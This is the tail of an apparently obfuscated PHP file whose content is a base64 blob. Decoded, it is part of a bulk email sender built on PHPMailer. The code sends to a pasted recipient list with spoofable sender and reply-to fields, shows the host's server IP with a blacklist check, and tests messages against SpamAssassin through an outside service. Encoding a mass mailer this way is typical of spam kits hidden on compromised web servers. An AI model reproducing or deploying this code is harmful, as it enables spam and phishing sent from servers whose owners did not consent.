FiZWw+CiAgICAgICAgICAgICAgICAgICAgPHNlbGVjdCBjbGFzcz0iZm9ybS1jb250cm9sIGlucHV0LXNtIiBpZD0iZW5jb2RlIiBuYW1lPSJlbmNvZGUiPgogICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uICcuJGJpdDguJz44Yml0PC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gJy4kYml0Ny4nPjdiaXQ8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiRiaW5hcnkuJz5iaW5hcnk8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiRiYXNlNjQuJz5iYXNlNjQ8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiRxdW90ZWRwcmludGFibGUuJz5xdW90ZWQtcHJpbnRhYmxlPC9vcHRpb24+CgogICAgICAgICAgICAgICAgICAgIDwvc2VsZWN0PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4tc20iIGZvcm09ImZvcm0iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InNlbmQiPlNFTkQ8L2J1dHRvbj4gb3IgPGEgaHJlZj0iIyIgb25jbGljaz0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoXCdmb3JtXCcpLnN1Ym1pdCgpOyByZXR1cm4gZmFsc2U7Ij5jaGVjayBTcGFtQXNzYXNzaW4gU2NvcmU8L2E+CiAgIAogICAgICAgIDwvZm9ybT4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY29sLWxnLTYiPjxicj4KICAgICAgICA8bGFiZWwgZm9yPSJ3ZWxsIj5JbnN0cnVjdGlvbjwvbGFiZWw+CiAgICAgICAgPGRpdiBpZD0id2VsbCIgY2xhc3M9IndlbGwgd2VsbCI+CiAgICAgICAgICAgIDxoND5TZXJ2ZXIgSW5mb3JtYXRpb248L2g0PgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+U2VydmVyIElQIEFkZHJlc3MgOiA8Yj4nLiRfU0VSVkVSWydTRVJWRVJfQUREUiddLicgPC9iPiA8YSBocmVmPSI/Y2hlY2tfaXA9Jy4kX1NFUlZFUlsnU0VSVkVSX0FERFInXS4nIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImxhYmVsIGxhYmVsLXByaW1hcnkiPkNoZWNrIEJsYWNrbGlzdCA8aSBjbGFzcz0iZ2x5cGhpY29uIGdseXBoaWNvbi1zZWFyY2giPjwvaT48L2E+PC9saT4KICAgICAgICAgICAgICAgIDxsaT5QSFAgVmVyc2lvbiA6IDxiPicucGhwdmVyc2lvbigpLic8L2I+PC9saT4KICAgICAgICAgICAgICAgIAoKICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPGg0PkhFTFA8L2g0PgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+Wy1lbWFpbC1dIDogPGI+UmVjaXZlciBFbWFpbDwvYj4gKGVtYWlsdXNlckBlbWFpbGRvbWFpbi5jb20pPC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+Wy1lbWFpbHVzZXItXSA6IDxiPkVtYWlsIFVzZXI8L2I+IChlbWFpbHVzZXIpIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPlstZW1haWxkb21haW4tXSA6IDxiPkVtYWlsIFVzZXI8L2I+IChlbWFpbGRvbWFpbi5jb20pIDwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPGxpPlstdGltZS1dIDogPGI+RGF0ZSBhbmQgVGltZTwvYj4gKCcuZGF0ZSgibS9kL1kgaDppOnMgYSIsIHRpbWUoKSkuJyk8L2xpPgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICA8bGk+Wy1yYW5kb21zdHJpbmctXSA6IDxiPlJhbmRvbSBzdHJpbmcgKDAtOSxhLXopPC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8bGk+Wy1yYW5kb21udW1iZXItXSA6IDxiPlJhbmRvbSBudW1iZXIgKDAtOSkgPC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8bGk+Wy1yYW5kb21sZXR0ZXJzLV0gOiA8Yj5SYW5kb20gTGV0dGVycyhhLXopIDwvYj48L2xpPgogICAgICAgICAgICAgICAgPGxpPlstcmFuZG9tbWQ1LV0gOiA8Yj5SYW5kb20gTUQ1IDwvYj48L2xpPgogICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8aDQ+ZXhhbXBsZTwvaDQ+CiAgICAgICAgICAgIFJlY2VpdmVyIEVtYWlsID0gPGI+dXNlckBkb21haW4uY29tPC9iPjxicj4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxpPmhlbGxvIDxiPlstZW1haWx1c2VyLV08L2I+ID0gaGVsbG8gPGI+dXNlcjwvYj48L2xpPgogICAgICAgICAgICAgICAgPGxpPnlvdXIgZG9tYWluIGlzIDxiPlstZW1haWxkb21haW4tXTwvYj4gPSBZb3VyIERvbWFpbiBpcyA8Yj5kb21haW4uY29tPC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8bGk+eW91ciBjb2RlIGlzICA8Yj5bLXJhbmRvbW1kNS1dPC9iPiA9IHlvdXIgY29kZSBpcyA8Yj5lMTBhZGMzOTQ5YmE1OWFiYmU1NmUwNTdmMjBmODgzZTwvYj48L2xpPgogICAgICAgICAgICA8L3VsPgoKICAgICAgICAgICAgPGg2PmJ5IDxiPjxhIGhyZWY9Imh0dHA6Ly8nLiRsZWFmWyd3ZWJzaXRlJ10uJyI+Jy4kbGVhZlsnd2Vic2l0ZSddLic8L2E+PC9iPjwvaDY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4nOyAgCmlmKCRfUE9TVFsnYWN0aW9uJ109PSJzZW5kIil7CiAgICBwcmludCAnICAgIDxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+JzsKICAgICRtYWlsbGlzdD1leHBsb2RlKCJcclxuIiwgJGVtYWlsTGlzdCk7CiAgICAkbj1jb3VudCgkbWFpbGxpc3QpOwogICAgJHggPTE7CiAgICBmb3JlYWNoICgkbWFpbGxpc3QgYXMgJGVtYWlsICkgewogICAgICAgIHByaW50ICc8ZGl2IGNsYXNzPSJjb2wtbGctMSI+WycuJHguJy8nLiRuLiddPC9kaXY+PGRpdiBjbGFzcz0iY29sLWxnLTQiPicuJGVtYWlsLic8L2Rpdj4nOwogICAgICAgIGlmKCFsZWFmTWFpbENoZWNrKCRlbWFpbCkpIHsKICAgICAgICAgICAgcHJpbnQgJzxkaXYgY2xhc3M9ImNvbC1sZy02Ij48c3BhbiBjbGFzcz0ibGFiZWwgbGFiZWwtZGVmYXVsdCI+SW5jb3JyZWN0IEVtYWlsPC9zcGFuPjwvZGl2Pic7CiAgICAgICAgICAgIHByaW50ICI8YnI+XHJcbiI7CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkbWFpbCA9IG5ldyBQSFBNYWlsZXI7CiAgICAgICAgICAgICRtYWlsLT5zZXRGcm9tKGxlYWZDbGVhcigkc2VuZGVyRW1haWwsJGVtYWlsKSxsZWFmQ2xlYXIoJHNlbmRlck5hbWUsJGVtYWlsKSk7CiAgICAgICAgICAgICRtYWlsLT5hZGRSZXBseVRvKGxlYWZDbGVhcigkcmVwbHlUbywkZW1haWwpKTsKICAgICAgICAgICAgJG1haWwtPmFkZEFkZHJlc3MoJGVtYWlsKTsKICAgICAgICAgICAgJG1haWwtPlN1YmplY3QgPSBsZWFmQ2xlYXIoJHN1YmplY3QsJGVtYWlsKTsKICAgICAgICAgICAgJG1haWwtPkJvZHkgPSAgbGVhZkNsZWFyKCRtZXNzYWdlTGV0dGVyLCRlbWFpbCk7CiAgICAgICAgICAgIGlmKCRtZXNzYWdlVHlwZT09MSl7CiAgICAgICAgICAgICAgICAkbWFpbC0+SXNIVE1MKHRydWUpOwogICAgICAgICAgICAgICAgJG1haWwtPkFsdEJvZHkgPXN0cmlwX3RhZ3MobGVhZkNsZWFyKCRtZXNzYWdlTGV0dGVyLCRlbWFpbCkpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgJG1haWwtPklzSFRNTChmYWxzZSk7CiAgICAgICAgICAgICRtYWlsLT5DaGFyU2V0ID0gJGNoYXJzZXQ7CiAgICAgICAgICAgICRtYWlsLT5FbmNvZGluZyA9ICRlbmNvZGluZzsKICAgICAgICAgICAgZm9yKCRpPTA7ICRpPGNvdW50KCRfRklMRVNbJ2F0dGFjaG1lbnQnXVsnbmFtZSddKTsgJGkrKykgewogICAgICAgICAgICAgICAgaWYgKCRfRklMRVNbJ2F0dGFjaG1lbnQnXVsndG1wX25hbWUnXVskaV0gIT0gIiIpewogICAgICAgICAgICAgICAgICAgICRtYWlsLT5BZGRBdHRhY2htZW50KCRfRklMRVNbJ2F0dGFjaG1lbnQnXVsndG1wX25hbWUnXVskaV0sJF9GSUxFU1snYXR0YWNobWVudCddWyduYW1lJ11bJGldKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICghJG1haWwtPnNlbmQoKSkgewogICAgICAgICAgICAgICAgZWNobyAnPGRpdiBjbGFzcz0iY29sLWxnLTYiPjxzcGFuIGNsYXNzPSJsYWJlbCBsYWJlbC1kZWZhdWx0Ij4nLmh0bWxzcGVjaWFsY2hhcnMoJG1haWwtPkVycm9ySW5mbykuJzwvc3Bhbj48L2Rpdj4nOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgZWNobyAnPGRpdiBjbGFzcz0iY29sLWxnLTYiPjxzcGFuIGNsYXNzPSJsYWJlbCBsYWJlbC1zdWNjZXNzIj5Pazwvc3Bhbj48L2Rpdj4nOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHByaW50ICI8YnI+XHJcbiI7CiAgICAgICAgfQogICAgICAgICR4Kys7CiAgICAgICAgZm9yKCRrID0gMDsgJGsgPCA0MDAwMDsgJGsrKykge2VjaG8gJyAnO30KICAgIH0KCn0KZWxzZWlmKCRfUE9TVFsnYWN0aW9uJ109PSJzY29yZSIpewogICAgJG1haWwgPSBuZXcgUEhQTWFpbGVyOwogICAgJG1haWwtPnNldEZyb20obGVhZkNsZWFyKCRzZW5kZXJFbWFpbCwkZW1haWwpLGxlYWZDbGVhcigkc2VuZGVyTmFtZSwkZW1haWwpKTsKICAgICRtYWlsLT5hZGRSZXBseVRvKGxlYWZDbGVhcigkcmVwbHlUbywkZW1haWwpKTsKICAgICRtYWlsLT5hZGRBZGRyZXNzKCJ1c2VybmFtZUBkb21haW4uY29tIik7CiAgICAkbWFpbC0+U3ViamVjdCA9IGxlYWZDbGVhcigkc3ViamVjdCwkZW1haWwpOwogICAgJG1haWwtPkJvZHkgPSAgbGVhZkNsZWFyKCRtZXNzYWdlTGV0dGVyLCRlbWFpbCk7CiAgICBpZigkbWVzc2FnZVR5cGU9PTEpewogICAgICAgICRtYWlsLT5Jc0hUTUwodHJ1ZSk7CiAgICAgICAgJG1haWwtPkFsdEJvZHkgPXN0cmlwX3RhZ3MobGVhZkNsZWFyKCRtZXNzYWdlTGV0dGVyLCRlbWFpbCkpOwogICAgfQogICAgZWxzZSAkbWFpbC0+SXNIVE1MKGZhbHNlKTsKICAgICRtYWlsLT5DaGFyU2V0ID0gJGNoYXJzZXQ7CiAgICAkbWFpbC0+RW5jb2RpbmcgPSAkZW5jb2Rpbmc7CiAgICAkbWFpbC0+cHJlU2VuZCgpOwogICAgJG1lc3NhZ2VIZWFkZXJzPSRtYWlsLT5nZXRTZW50TUlNRU1lc3NhZ2UoKTsKICAgICRjaCA9IGN1cmxfaW5pdCgpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICdodHRwOi8vc3BhbWNoZWNrLnBvc3RtYXJrYXBwLmNvbS9maWx0ZXInKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCBodHRwX2J1aWxkX3F1ZXJ5KGFycmF5KCdlbWFpbCcgPT4gJG1lc3NhZ2VIZWFkZXJzLCdvcHRpb25zJz0+J2xvbmcnKSkpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCAwKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9USU1FT1VULCAxNSk7CiAgICAkcmVzcG9uc2UgPSBjdXJsX2V4ZWMoJGNoKTsKICAgICRyZXNwb25zZSA9IGpzb25fZGVjb2RlKCRyZXNwb25zZSk7CiAgICBwcmludCAnICAgIDxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+JzsKICAgIGlmICgkcmVzcG9uc2UtPnN1Y2Nlc3MgPT0gVFJVRSApewogICAgICAgICRzY29yZSA9ICRyZXNwb25zZS0+c2NvcmU7CiAgICAgICAgaWYgKCRzY29yZSA+IDUgKSAkY2xhc3M9ImRhbmdlciI7CiAgICAgICAgZWxzZSAkY2xhc3M9InN1Y2Nlc3MiOwogICAgICAgICAgICBwcmludCAnPGRpdiBjbGFzcz0idGV4dC0nLiRjbGFzcy4nIj5Zb3VyIFNwYW1Bc3Nhc3NpbiBzY29yZSBpcyAnLiRzY29yZS4nICA8L2Rpdj4KPGRpdj5GdWxsIFJlcG9ydCA6IDxwcmU+Jy4kcmVzcG9uc2UtPnJlcG9ydC4nPC9wcmU+PC9kaXY+JzsKcHJpbnQgJyAgICA8L2Rpdj4nOwogICAgfQp9CnByaW50ICc8L2JvZHk+Jzs="));
?>
